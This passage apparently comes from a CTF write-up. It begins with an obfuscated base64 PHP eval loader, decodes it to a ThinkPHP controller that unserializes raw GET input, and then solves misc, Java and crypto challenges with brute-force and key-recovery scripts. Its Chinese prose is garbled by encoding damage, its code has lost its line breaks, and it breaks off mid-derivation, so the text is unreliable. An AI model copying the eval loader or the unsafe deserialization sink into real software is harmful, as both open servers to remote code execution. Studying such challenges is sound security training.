ZXBFalZjb3JpczJyTVNFVUtoWjlWaFZqSlZ2NU16VlRBekVXZ2hOdUZPS2pwczFaS05CekJidmhTVlpWeXBWQk5SSldwVk5yTk9EV05oMVZkYkVoZ1ZOVUtWRXVYUHZWZHNCQlpWb3JlczIxQVBORUVoWmpCcG9yTVZCVjRwdlZWaEJ1eWhKV2tpS2pOY0JCTHoyOXRQRFlJRndaMHAxU3FHZFZpRkVHT0YwU0ZjQlZWUHY1RmNkU1FGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxFU3BOYUtGWkdNYk5qZk5Eak5VMnpJc29hNGJCenFpQnpjVTFqMHNCVnZzQmphaUxTdGhLRXZzVkd2aDFCNXAzU3Rob3JhT1p1cGNCR0pHMmFGcDN1cVYyNXlWMHJtVUxTdGhLRXZzVkd2aDFCNXAzV0NzMk0zZmdaa3lLOCtISjlBcGR4WUd2Vm9wTjVCdFh6ZEdOU3RiczRyY0RmM2plcmpGMnJpekxZcmNEZjN0aU1aaEJrUVBtajBITmp1UjJzMlNFOVpHTlNRR3ZzVGZvam5oREdHcGlCME5WaE5PMmhxc0x6dVZtWjBpRXVYU3ZoT2hEVkNwQmtLTzIxMHAxazZidkdwVjJ1bk9LU1p6WjVKenYxU1BvaHJHc1ZaVnZtZVNMekRiRVQyT0tFRk52aGFWWmhWYm1HME9OMVROTkVPYkVFWmNOclVzS1dGekJFSWJtYU5WMEduc1ZzMXBWalZwZFNwRm1HdXNvNUZjVmhkTm81c3NpMDlmZ1o3anYxcVYydWlGSjBaaEJrUVBtajBOS1N6Q2dodk5vOTRVd2hiU0IwcWptR3BiM3VYekVNS2MxMHFqbUdwYjN1WHpFTUtjRTA3akVHR1YyUzRHSjBaaEJrUVBtajBOS2NLTEY0WmhCa1FQbWowTkttQUxGNFpoQmtRUG1qME5LZjBMRjRaaEJrUVBtajBOS21BTEY0WmhCa1FQbWowTktmMExpTVpPTkdWekJ6c0hGaE5OVnpEUHZoYmNFMHFqbUdwYjN1WHpFTXJ5RTBxam1HcGIzdVh6RU1LTEY0WlZCQkxPM3VaTktXekNnaE5OVnpEUHZoYmNWMHFqbUdwYjN1WHpFTWVTRTA3anZCWnoyclNzSzBaaEJrUVBtajBOS3p6Q2dodk5vOTRVd2hiY2lTenllaGFiQnpUczBZcUhGaHZObzk0VXdoYmNEanpDZ2h2Tm85NFV3aGJjS0d6Q2dodk5vOTRVd2hiY0RCekNnaHZObzk0VXdoYmNER3pDZ2h2Tm85NFV3aGJjS1d6Q2dodk5vOTRVd2hiY0tqekNnaHZObzk0VXdoYmNLVnpDZ2h2Tm85NFV3aGJjREd6Q2dodk5vOTRVd2hiY0tXenkyVjJPTkFUanYxcVYydWlGWFlnRlp6cHMxVnFzRGhHUERXa1ZOYTRpMmhJY2loQmJOdW5zWlZwc3ZoRUZCekZjc0d1czF1WnpWa2RjTEJnaEJqTnNpVzBob0VMR3YxQlZvcnJWaVN5UEVFTlVaYVpObWprczB6TnBFenZHZGpnYzFmMXMxek1SQlpyaW81R1ZzRzRPREVGT1ZWRUd2ckZWTGhKVm1zcnMyU2RTVmpOY0JrS3NaR01oRWhJTndrWmNEbTJWMEdwY0JTZFJ2Qk5ORU8wczI1dHN2RWRzRGpoVnZySnMyNU5WMmp2VkJTRFZCanZPMmFNVTJjQXlza2dwM2hmTzFWdHB2U0xpRFNOVm1acmlzenZzMDlPUkVHRmNzamRPRFd0cDJqRWNMQmlWS1Zjc0RTdlUxQk9ob2twYlo1NXMxUjFibTFuYmRFc05FR2pPVkdORkVaZVNOdVpjM1dLTm9ydEZvVnFpd0JpVlo1Y3NaUjFSVmpWR0VFeWhMaGZWc2hGaUJmclV3RUZORUdlc2lqTnMyU05pWkdOY3ZyQVZCVjRjRWpNVkxCR2MzV3ZPMmEwUjJWRUZvYWhjZGhhVm9heXB2aE5VQmtOVk5oMUdKVzBGRWpzaEJHVnAyYTNzMk00U05FSXptdWdiTFd2c0RFV2N2amRObzlnaExoYVZvYXlpdmhPUmRTaWNCa0xzaVcwYlZHSWlacnBiZFdrc0JHTWhFVEFWQldTVnNreUdFelRwMVNmaGlWWk5FamhHbUdORnMwclJkV0dWMWt5VkV6NHp2am5HdjFMVkJrbXNLanBWMW1BenYxTnAwNWNOb3JwaEVjS1ZCRXVic1Y1VnNWcEYxVUtoREdpYlpra09vMTRGRVNkR3Z1U2J2UzVzMXVFU05FRVZCV2lWMnJ2c0RFWnAxU2ZoaVZaTkVqaEdtR05GczByUmRXR1Yxa3lWRXo0enZFbUd2MUxWQmttc0tqcFYxbUF6djFOcDA1SE5CekZoRWNlTkJ6aGNkaGFWb2F5aXZoVnBkVnNORUdoc29yTk5CR01iRUVTYm1mMk8za2pTVkdFemR1WmgycmNzWlZNT1ZVZVNOcnBjZGg0TkRqdEZzMXFod0VpY0VqdE9WR05zRU9BaUJqU3BCanFzS1NaU29qRXp2MU5wMDVjR0VoWFIxa01iRXpoY2RoYVYyYXRpQlVBcEpHaXBLQmVzaVdOaVZWZFJka1NjMWprVkJoamNFbWVWQmhaaEVUMFZEajBVMUdOaFprWmJFR3BzaWp0YlZ6Tk5aaGljQmt1aURqcE5CR0lpWnJwYkVrbXNLanBWMW1laEJTVmhtanlPMmFUUlZjZU5aNVpjMDU1Tk5rTlNtMU5SbXJOYzBzMVYwVkFzb2h2c3dqVmh2dW5OVmhFU1ZzZXptak5wMGtlc1ZHQWkyRTZGd3VWTnZ1NU9va05TdlNhU0pFQkZtazFpQnVUUE5qbmJtQlZjM1dLc0tqcFYxbUF6SkVTaDN1SE5Cemh5c0JuenZyWmJzR0tGMFNEQzFXa08zVnRoS0UxVkRqVFZFU0pHMmFOYnZyT05pU1RwMGFKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc0Yya2pSbXJKc291cGJFT2VWREVoYjBrZE5CU1ZiQmYwTkxCM3AyRUxzRFNnaGlFc2ltU0ZSRWtmR2RTc1ZaMUFpbVNGcEVrTVZEak5jVkVRRlp6cHMxVnFzRGhHUEx6M2ltU0ZSRWtmR2RTc1ZaMUFGMVNJUm05M0hpMGd0Rlo3SEs0PSI7ZXZhbCgnPz4nLiRhckNpQ0woJFZ2VXJCWigkREVvbUtrKCRWQ0JaUVcsJExucG52WSoyKSwkREVvbUtrKCRWQ0JaUVcsJExucG52WSwkTG5wbnZZKSwkREVvbUtrKCRWQ0JaUVcsMCwkTG5wbnZZKSkpKTs=&quot;));?&gt; å°è¯•æ‰‹åŠ¨é€å±‚è§£å¯†ï¼Œæœ€åå¾—åˆ°ï¼š 1234567891011121314151617181920&lt;?phpnamespace app\\controller;use app\\BaseController;class Index extends BaseController&#123; public function index() &#123; if(!empty($_GET[&#x27;pop&#x27;]))&#123; unserialize(base64_decode($_GET[&#x27;pop&#x27;])); &#125; return &quot;Welcom To CAZT! Xi&#x27;an Come On!&quot;; &#125; public function C4zyC0m3On() &#123; return &#x27;cazy&#123;PHP_ji4m1_1s_s00000_3aSyyyyyyyyyyy&#125;&#x27;; &#125;&#125; â€‹ Ez_Stegzipå‹ç¼©åŒ…æ ¹æ®æç¤ºçˆ†ç ´6ä½æ•°å­—å¯†ç ä¸º 220101ï¼Œè§£å‹æœ‰ steg.pyc å’Œ flag.txtã€‚ ç”¨uncompyle6é€†pycå‘ç°æ— æœ‰æ„ä¹‰ä»£ç ï¼Œä¸ºpycéšå†™ï¼Œç”¨stegosauruså·¥å…·è§£å¯†ï¼š python stegosaurus.py steg.pyc -x å¾—åˆ°å¯†ç  Extracted payload: TheKey:St3g1sV3ryFuNnyã€‚ å†å°† flag.txt ä¸­emojiå¯†æ–‡ç”¨emoji-aesè§£å¾—åˆ°flagï¼šcazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125; â€‹ binary äºŒè¿›åˆ¶ æ–‡ä»¶å¤´ CAFEBABE è¯´æ˜ä¸º .class Javaå­—èŠ‚ç æ–‡ä»¶ï¼Œç”¨jadxæŸ¥çœ‹ï¼š 12345678package defpackage;/* renamed from: Main reason: default package */public class Main &#123; public static void main(String[] strArr) &#123; byte[] bArr = &#123;77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61&#125;; &#125;&#125; 10è¿›åˆ¶è½¬å­—ç¬¦ä¸²ï¼Œbase64è§£ç å¾—åˆ°ï¼š 0000000101110000000011111101110000000\\n0111110101101010111110001110110111110\\n0100010100001111000111010110110100010\\n0100010110000011000111000001010100010\\n0100010111011011001101101011110100010\\n0111110101110100000001001000010111110\\n0000000101010101010101010101010000000\\n1111111100100000000100110011111111111\\n1100010101010000101111110100000011000\\n0101101000110010010000100110101011101\\n1011000001001111001100011010000010010\\n1110111111110010101101000110101011100\\n1010110001110000000110100000000000010\\n0110101001000100011011101011101111101\\n0010100100111111101110000110010100010\\n0010001101110110110011001100110011101\\n1110100110001111111011010011000000010\\n0000111010100011100000101101111110111\\n1101100110101101001100010100110000100\\n0101001001111001000001001110010010111\\n0101010011000111000110010000010101000\\n1001101111101110110010011111101011101\\n1101100010111000000101110110001011010\\n0011001000111101100011110100100111101\\n0101000001110101110110101111110100010\\n0101011011001001000000110100010011111\\n0110100010001110010110011011111001100\\n0111001111100000010110110111001111100\\n0100110010110010100010111011000000000\\n1111111101011001110011100101011101011\\n0000000111000111011010110001010100100\\n0111110111001101010110101100011101111\\n0100010100110000110011010000000000010\\n0100010101111101100011111111110100111\\n0100010101101111111100000010101010110\\n0111110111111000101101001111000110110\\n0000000111111011110110000000100011000 37*37çš„01å­—ç¬¦ä¸²ï¼Œè½¬ä¸ºäºŒç»´ç ï¼š 123456789101112s=&#x27;0000000101110000000011111101110000000011111010110101011111000111011011111001000101000011110001110101101101000100100010110000011000111000001010100010010001011101101100110110101111010001001111101011101000000010010000101111100000000101010101010101010101010000000111111110010000000010011001111111111111000101010100001011111101000000110000101101000110010010000100110101011101101100000100111100110001101000001001011101111111100101011010001101010111001010110001110000000110100000000000010011010100100010001101110101110111110100101001001111111011100001100101000100010001101110110110011001100110011101111010011000111111101101001100000001000001110101000111000001011011111101111101100110101101001100010100110000100010100100111100100000100111001001011101010100110001110001100100000101010001001101111101110110010011111101011101110110001011100000010111011000101101000110010001111011000111101001001111010101000001110101110110101111110100010010101101100100100000011010001001111101101000100011100101100110111110011000111001111100000010110110111001111100010011001011001010001011101100000000011111111010110011100111001010111010110000000111000111011010110001010100100011111011100110101011010110001110111101000101001100001100110100000000000100100010101111101100011111111110100111010001010110111111110000001010101011001111101111110001011010011110001101100000000111111011110110000000100011000&#x27;from PIL import Imageimg = Image.new(&#x27;RGB&#x27;,(37,37))width , height = img.sizefor i in range(0,width): for j in range(0,height): if s[37*i+j]==&#x27;0&#x27;: img.putpixel((i,j),(0,0,0)) else: img.putpixel((i,j),(255,255,255))img.save(&#x27;out.png&#x27;) æ‰«ç å¾—flagï¼šflag&#123;932b2c0070e4897ea7df0190dbf36ece&#125; â€‹ CRYPTOLinearEquations 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import*from secret import flagassert flag[:5] == b&#x27;cazy&#123;&#x27;assert flag[-1:] == b&#x27;&#125;&#x27;flag = flag[5:-1]assert(len(flag) == 24)class my_LCG: def __init__(self, seed1 , seed2): self.state = [seed1,seed2] self.n = getPrime(64) while 1: self.a = bytes_to_long(flag[:8]) self.b = bytes_to_long(flag[8:16]) self.c = bytes_to_long(flag[16:]) if self.a &lt; self.n and self.b &lt; self.n and self.c &lt; self.n: break def next(self): new = (self.a * self.state[-1] + self.b * self.state[-2] + self.c) % self.n self.state.append( new ) return newdef main(): lcg = my_LCG(getRandomInteger(64),getRandomInteger(64)) print(&quot;data = &quot; + str([lcg.next() for _ in range(5)])) print(&quot;n = &quot; + str(lcg.n))if __name__ == &quot;__main__&quot;: main() # data = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]# n = 10104483468358610819 é­”æ”¹ä¸‰å‚æ•°LCGï¼Œåˆ©ç”¨æ»¡è¶³çš„å…¬å¼ $as_{i-1}+bs_{i-2}+c \\equiv s_i \\pmod n$ï¼Œå¾—åˆ°ä¸‰å…ƒä¸€æ¬¡åŒä½™æ–¹ç¨‹ç»„ï¼Œåˆ©ç”¨GrÃ¶bneråŸºæ±‚è§£ï¼š 1234567891011121314151617d = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396]n = 10104483468358610819PR.&lt;a,b,c&gt; = PolynomialRing(Zmod(n))f1 = (a*d[1]+b*d[0]+c-d[2])f2 = (a*d[2]+b*d[1]+c-d[3])f3 = (a*d[3]+b*d[2]+c-d[4])Fs = [f1, f2, f3]I = Ideal(Fs)B = I.groebner_basis()m = b&#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0)) m += bytes.fromhex(hex(mi)[2:])print(m)# b&#x27;L1near_Equ4t1on6_1s_34sy&#x27; æ‹¼æ¥ï¼šcazy&#123;L1near_Equ4t1on6_1s_34sy&#125; â€‹ no_can_no_bb 123456789101112131415161718192021import randomfrom Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESfrom secret import flagassert flag[:5] ==b&#x27;cazy&#123;&#x27;def pad(m): tmp = 16-(len(m)%16) return m + bytes([tmp for _ in range(tmp)])def encrypt(m,key): aes = AES.new(key,AES.MODE_ECB) return aes.encrypt(m)if __name__ == &quot;__main__&quot;: flag = pad(flag) key = pad(long_to_bytes(random.randrange(1,1&lt;&lt;20))) c = encrypt(flag,key) print(c)# b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; randomèŒƒå›´ä¸å¤§ï¼Œçˆ†ç ´keyè§£AES-ECBï¼š 1234567891011121314151617181920from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESdef pad(x): tmp = 16-(len(x)%16) return x + bytes([tmp for _ in range(tmp)])def decrypt(c,key): aes = AES.new(key,AES.MODE_ECB) return aes.decrypt(c)if __name__ == &quot;__main__&quot;: for i in range(1&lt;&lt;20): key = pad(long_to_bytes(i)) c = b&#x27;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c&#x27; m = decrypt(c,key) if m.startswith(b&#x27;cazy&#123;&#x27;): print(m) # b&#x27;cazy&#123;n0_c4n,bb?n0p3!&#125;\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b&#x27; â€‹ no_cry_no_can 1234567891011121314from Crypto.Util.number import*from secret import flag,keyassert len(key) &lt;= 5assert flag[:5] == b&#x27;cazy&#123;&#x27;def can_encrypt(flag,key): block_len = len(flag) // len(key) + 1 new_key = key * block_len return bytes([i^j for i,j in zip(flag,new_key)])c = can_encrypt(flag,key)print(c)# b&#x27;&lt;pH\\x86\\x1a&amp;&quot;m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l&#x27; keyä¸º5ä½ï¼Œå·²çŸ¥flagå¤´5ä½ï¼Œä¸å¯†æ–‡å¼‚æˆ–å¾—key = b&#39;\\x5f\\x11\\x32\\xff\\x61&#39;ï¼Œå†å¼‚æˆ–å¯†æ–‡è¿˜åŸæ˜æ–‡ï¼š cazy&#123;y3_1s_a_h4nds0me_b0y!&#125; â€‹ no_math_no_cry 123456789101112131415from Crypto.Util.number import*from secret import flagassert len(flag) &lt;= 80def sec_encry(m): cip = (m - (1&lt;&lt;500))**2 + 0x0338470 return cipif __name__ == &quot;__main__&quot;: m = bytes_to_long(flag) c = sec_encry(m) print(c)# 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169 ç®€å•é€†å›å»å°±å¥½ï¼Œæ³¨æ„ä¸€ä¸‹å¼€æ–¹å–è´Ÿå€¼ï¼š 1234567c = 10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169c -= 0x0338470import gmpy2m = -gmpy2.iroot(c,2)[0]print(bytes.fromhex(hex(m+(1&lt;&lt;500))[2:]))# b&#x27;cazy&#123;1234567890_no_m4th_n0_cRy&#125;&#x27; â€‹ math æ•°å­¦æœ€é‡è¦çš„å°±æ˜¯æ¨å¯¼ 12345pinvq:0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3qinvp:0x79388eb6c541fffefc9cfb083f3662655651502d81ccc00ecde17a75f316bc97a8d888286f21b1235bde1f35efe13f8b3edb739c8f28e6e6043cb29569aa0e7bc:0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386e:0x10005d:0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 ç»™å‡º $x=\\text{inv}(p,q),y=\\text{inv}(q,p),e,d,c$ã€‚ è¯¦ç»†æ¨å¯¼æ€è·¯å¯å‚è€ƒ HITCON 2019 - Lost Modulus Againã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import gmpy2from itertools import productimport binasciifrom Crypto.Util.number import *&quot;&quot;&quot;alpha = p&#x27; * q&#x27; - lbeta = l^2 * [(e * d - 1) / s] + q&#x27; * l + p&#x27; * l - p&#x27; * q&#x27; - alpha - l^2i.e.:beta = l^2 